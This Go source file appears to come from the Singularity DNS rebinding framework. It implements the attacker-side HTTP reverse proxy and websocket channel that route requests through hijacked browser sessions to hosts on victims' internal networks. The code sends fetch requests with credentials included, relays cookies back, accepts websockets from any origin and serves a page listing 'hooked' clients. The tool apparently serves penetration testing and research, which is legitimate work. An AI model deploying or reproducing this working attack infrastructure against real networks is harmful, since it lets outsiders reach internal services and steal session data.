package singularity

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// WebsocketClientStateStore keeps track of all targets hooked via websockets
type WebsocketClientStateStore struct {
	sync.RWMutex
	Sessions map[string]*WebsocketClientState
}

// WebsocketClientState maintains information about a target hooked via websockets
type WebsocketClientState struct {
	LastSeenTime time.Time
	Host         string
	WSClient     *WSClient
}

type hookedClientHandler struct {
	wscss               *WebsocketClientStateStore
	httpProxyServerPort int
}

type templateHookedClienData struct {
	Sessions            map[string]*WebsocketClientState
	HTTPProxyServerPort int
	Hostname            string
}

func (hch *hookedClientHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	funcMap := template.FuncMap{
		"FormatDate": func(value time.Time) string {
			return value.Format(time.RFC3339)
		},
	}
	const tpl = `
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>Hooked WS Clients</title>
	</head>
	<h3>Hooked WS Clients</h3>
	<body>
	<ul>
	{{ $hostname := .Hostname }}
	{{ $port := .HTTPProxyServerPort}}
	{{ range $key, $value := .Sessions }}
	<li><a target="_blank" rel="noopener noreferrer" href="http://{{ $key }}.{{ $hostname }}:{{ $port }}/">{{ $key }}</a> {{ $value.Host }} {{FormatDate $value.LastSeenTime }} </li>
    {{ end }}
    </ul>
	</body>
</html>`
	check := func(err error) {
		if err != nil {
			log.Fatal(err)
		}
	}
	t, err := template.New("webpage").Funcs(funcMap).Parse(tpl)
	check(err)
	host, _, err := net.SplitHostPort(r.Host)
	check(err)
	host = strings.Replace(host, "soohooked.", "", 1)
	templateData := templateHookedClienData{Sessions: hch.wscss.Sessions,
		HTTPProxyServerPort: hch.httpProxyServerPort, Hostname: host}
	hch.wscss.RLock()
	err = t.Execute(w, templateData)
	hch.wscss.RUnlock()
	check(err)

}

// ProxyHandler is an HTTP proxy for an attacker to interact with hijacked JavaScript Clients
type ProxyHandler struct {
	Wscss *WebsocketClientStateStore
	Dcss  *DNSClientStateStore
}

// Custom transport to bridge Singularity reverse proxy to target via websockets
type ProxytoWebsocketTransport struct {
	WSClient *WSClient
}

type fetchRequest struct {
	ID          uint64            `json:"id"`
	Method      string            `json:"method"`
	Mode        string            `json:"mode"`
	Cache       string            `json:"cache"`
	Credentials string            `json:"credentials"`
	Headers     map[string]string `json:"headers"`
	Redirect    string            `json:"redirect"`
	Referrer    string            `json:"referrer"`
	Body        []byte            `json:"body"`
}

type fetchResponse struct {
	ID       uint64   `json:"id"`
	Command  string   `json:"command"`
	Response response `json:"response"`
	Body     []byte   `json:"body"`
}

type response struct {
	Headers    map[string]string `json:"headers"`
	Ok         bool              `json:"ok"`
	Redirected bool              `json:"redirected"`
	Status     int               `json:"status"`
	Type       string            `json:"type"`
	URL        string            `json:"url"`
	//	Body       []byte            `json:"body"`
	BodyUsed bool     `json:"bodyUsed"`
	Cookies  []string `json:"cookies"`
}

type fetchPayload struct {
	URL          string        `json:"url"`
	FetchRequest *fetchRequest `json:"fetchrequest"`
}

type websocketOperation struct {
	Command string        `json:"command"`
	Payload *fetchPayload `json:"payload"`
}

// WSCall is an active Web Socket Request
type WSCall struct {
	Req   fetchRequest
	Res   fetchResponse
	Done  chan bool
	Error error
}

func newWSCall(req fetchRequest) *WSCall {
	done := make(chan bool)
	return &WSCall{
		Req:  req,
		Done: done,
	}
}

// WSClient is a Websocket client used by Singularity to channel reverse proxy requests to target via websockets.
type WSClient struct {
	mutex   sync.Mutex
	conn    *websocket.Conn
	pending map[uint64]*WSCall
	counter uint64
}

// AuthHandler is an HTTP header token authentication handler
type AuthHandler struct {
	NextHandler http.Handler
	AuthToken   string
}

func (ah *AuthHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if p, ok := Auth(r); !ok || !(p == ah.AuthToken) {
		http.Error(w, "Authorization failed. Check the Singularity-Of-Origin HTTP header and value.", http.StatusUnauthorized)
		return
	}
	ah.NextHandler.ServeHTTP(w, r)
}

// Auth validates the authentication token
func Auth(r *http.Request) (AuthToken string, ok bool) {
	auth := r.Header.Get("Singularity-Of-Origin")
	if auth == "" {
		return
	}
	return auth, true
}

func NewWSClient() *WSClient {
	return &WSClient{
		pending: make(map[uint64]*WSCall, 1),
		counter: 1,
	}
}

// http://hassansin.github.io/request-response-pattern-using-go-channles
func (c *WSClient) Request(op *websocketOperation) (interface{}, error) {
	c.mutex.Lock()
	id := c.counter
	c.counter++
	op.Payload.FetchRequest.ID = id
	call := newWSCall(*op.Payload.FetchRequest)
	c.pending[id] = call
	err := c.conn.WriteJSON(&op)
	if err != nil {
		delete(c.pending, op.Payload.FetchRequest.ID)
		c.mutex.Unlock()
		return nil, err
	}
	c.mutex.Unlock()
	select {
	case <-call.Done:
	case <-time.After(90 * time.Second):
		fmt.Printf("websockets: timeout ID:%v, %v\n", call.Req.ID, op.Payload.URL)
		call.Error = errors.New("websockets: time out")
	}

	if call.Error != nil {
		return nil, call.Error
	}
	return call.Res, nil
}

func (c *WSClient) read() {
	var err error
	pongWait := time.Second * 100
	c.conn.SetReadDeadline(time.Now().Add(pongWait))
	c.conn.SetPongHandler(func(string) error {
		c.conn.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})

	for err == nil {
		var res fetchResponse
		err = c.conn.ReadJSON(&res)
		if err != nil {
			err = fmt.Errorf("websockets: error reading message: %q", err)
			continue
		}
		c.mutex.Lock()
		call := c.pending[res.ID]
		delete(c.pending, res.ID)
		c.mutex.Unlock()
		if call == nil {
			err = errors.New("websockets: no pending request found")
			continue
		}
		call.Res = res
		call.Done <- true
	}
	c.mutex.Lock()
	for _, call := range c.pending {
		call.Error = err
		call.Done <- true
	}
	c.mutex.Unlock()
}

func (c *WSClient) keepAlive(wscss *WebsocketClientStateStore, sessionID string) {
	pingPeriod := time.Second * 5
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()
	for {
		select {
		case <-ticker.C:
			if err := c.conn.WriteMessage(websocket.PingMessage, []byte{}); err != nil {
				wscss.Lock()
				_, ok := wscss.Sessions[sessionID]
				if ok {
					delete(wscss.Sessions, sessionID)
				}
				wscss.Unlock()
				return
			}
		}
	}
}

//RoundTrip is a custom RoundTrip implementation for reverse proxy to websocket
func (t *ProxytoWebsocketTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	headers := make(map[string]string)

	//flatten each header array of values
	for k, v := range req.Header {
		headers[k] = fmt.Sprintf("%v", strings.Join(v, "; "))
	}

	var body []byte

	if req.Body != nil {
		b, err := ioutil.ReadAll(req.Body)
		if err != nil {
			log.Printf("Error reading body: %v", err)
			return nil, err
		}

		body = b
		req.Body = ioutil.NopCloser(bytes.NewBuffer(b))
	}

	fetchRequest := &fetchRequest{
		Method:      req.Method, // *GET, POST, PUT, DELETE, etc.
		Body:        body,
		Mode:        "same-origin", // no-cors, cors, *same-origin
		Cache:       "no-cache",    // *default, no-cache, reload, force-cache, only-if-cached
		Credentials: "include",     // include, *same-origin, omit
		Headers:     headers,
		Redirect:    "follow", // manual, *follow, error
	}
	fetchRequest.Headers["Content-Length"] = strconv.Itoa(len(body))

	fetchPayload := &fetchPayload{
		URL:          req.RequestURI,
		FetchRequest: fetchRequest,
	}

	op := websocketOperation{
		Command: "fetch",
		Payload: fetchPayload,
	}

	received, err := t.WSClient.Request(&op)

	if err != nil {
		return nil, err
	}

	responseData := received.(fetchResponse)
	responseHeaders := make(http.Header, 0)

	for k, v := range responseData.Response.Headers {
		responseHeaders.Add(k, v)
	}

	for _, cookie := range responseData.Response.Cookies {
		responseHeaders.Add("Set-Cookie", fmt.Sprintf("%v; path=/", cookie))
	}

	var buf bytes.Buffer

	if responseHeaders.Get("Content-Encoding") == "gzip" {
		gz := gzip.NewWriter(&buf)
		if _, err := gz.Write(responseData.Body); err != nil {
			return nil, err
		}
		if err := gz.Flush(); err != nil {
			return nil, err
		}
		if err := gz.Close(); err != nil {
			return nil, err
		}
	} else {
		buf = *bytes.NewBuffer(responseData.Body)
	}

	resp := &http.Response{
		Status:        http.StatusText(responseData.Response.Status),
		StatusCode:    responseData.Response.Status,
		Proto:         "HTTP/1.1",
		ProtoMajor:    1,
		ProtoMinor:    1,
		Body:          ioutil.NopCloser(&buf),
		ContentLength: int64(buf.Len()),
		Request:       req,
		Header:        responseHeaders,
	}
	resp.Header.Set("Content-Length", strconv.Itoa(buf.Len()))

	return resp, nil
}

func (p *ProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	// Remove Singularity Auth Header so it is not forwarded to targets.
	r.Header.Del("Singularity-Of-Origin")

	proxiedURL, err := url.Parse(r.RequestURI)
	if err != nil {
		log.Fatal(err)
	}

	url := proxiedURL.RequestURI()
	fmt.Printf("Proxy: %v %v%v\n", r.Method, r.Host, url)

	re := regexp.MustCompile(`^([0-9]+)\.(.*)$`)
	matched := (re.FindStringSubmatch(r.Host))

	if len(matched) < 1 {
		http.Error(w, "Invalid URL", 502)
		return
	}

	MatchedURLSessionID := matched[1]
	MatchedURLRest := url

	p.Wscss.RLock()
	session, ok := p.Wscss.Sessions[MatchedURLSessionID]
	p.Wscss.RUnlock()

	var transport = &ProxytoWebsocketTransport{}

	if ok == true {
		transport.WSClient = session.WSClient
	} else {
		http.Error(w, "No matching session", 502)
		return
	}

	director := func(req *http.Request) {
		req.URL.Scheme = "http"
		req.URL.Host = session.Host
		req.URL.Path = MatchedURLRest
	}

	fmt.Printf("director: %v %v\n", session.Host, MatchedURLRest)

	proxy := &httputil.ReverseProxy{Director: director, Transport: transport}

	proxy.ServeHTTP(w, r)
}

func NewHTTPProxyServer(port int, dcss *DNSClientStateStore,
	//TKTK implement TLS
	wscss *WebsocketClientStateStore, hss *HTTPServerStoreHandler) *http.Server {
	proxyHandler := &ProxyHandler{Dcss: dcss, Wscss: wscss}
	proxyAuthHandler := &AuthHandler{AuthToken: hss.AuthToken,
		NextHandler: proxyHandler}
	//h := http.NewServeMux()
	hookedClientHandler := &hookedClientHandler{wscss: wscss, httpProxyServerPort: hss.HTTPProxyServerPort}
	hookedClientAuthHandler := &AuthHandler{AuthToken: hss.AuthToken,
		NextHandler: hookedClientHandler}

	router := mux.NewRouter()
	// Only matches if domain is "www.example.com".
	// Matches a dynamic subdomain.
	hookedSubRouter := router.Host(`{hookedSubRouter:soohooked.*}`).Subrouter()
	hookedSubRouter.Handle("/", hookedClientAuthHandler)

	proxySubRouter := router.Host(`{proxySubRouter:.*}`).Subrouter()
	proxySubRouter.PathPrefix("/").Handler(proxyAuthHandler)

	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: router}

	return httpServer
}

// StartHTTPProxyServer starts an HTTP reverse proxy server to target clients
func StartHTTPProxyServer(s *http.Server) error {
	var err error

	l, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return err
	}

	go func() {
		log.Printf("HTTP: starting HTTP Proxy Server on %v\n", s.Addr)
		s.Serve(l)
		//hss.Errc <- HTTPServerError{Err: routineErr, Port: s.Addr}
	}()

	return err
}

// WebsocketHandler is an WS endpoint for an attacker to interact with hijacked JavaScript Clients
type WebsocketHandler struct {
	wscss *WebsocketClientStateStore
	dcss  *DNSClientStateStore
}

func (ws *WebsocketHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	var upgrader = websocket.Upgrader{HandshakeTimeout: time.Second * 10,
		CheckOrigin: func(r *http.Request) bool {
			return true
		}}

	c, err := upgrader.Upgrade(w, r, nil)

	if err != nil {
		log.Print("could not upgrade the HTTP connection to a websocket connection: ", err)
		return
	}
	defer c.Close()

	name, err := NewDNSQuery(r.Header.Get("origin"))

	if err != nil {
		log.Printf("websockets: could not parse origin hostname: %v\n", err)
		return
	}

	ws.dcss.RLock()
	_, keyExists := ws.dcss.Sessions[name.Session]
	ws.dcss.RUnlock()

	if keyExists != true {
		log.Printf("websockets: does not have a matching DNS Session")
		return
	}

	u, err := url.Parse(r.Header.Get("origin"))

	if err != nil {
		log.Printf("websockets: could not parse origin header")
		return
	}

	host := fmt.Sprintf("%v:%v", u.Hostname(), u.Port())

	client := NewWSClient()
	client.conn = c

	fmt.Printf("websockets: started a new session %v\n", name.Session)

	ws.wscss.Lock()
	ws.wscss.Sessions[name.Session] = &WebsocketClientState{LastSeenTime: time.Now(),
		Host: host, WSClient: client}
	ws.wscss.Unlock()

	go client.keepAlive(ws.wscss, name.Session)

	for {
		client.read()
	}
}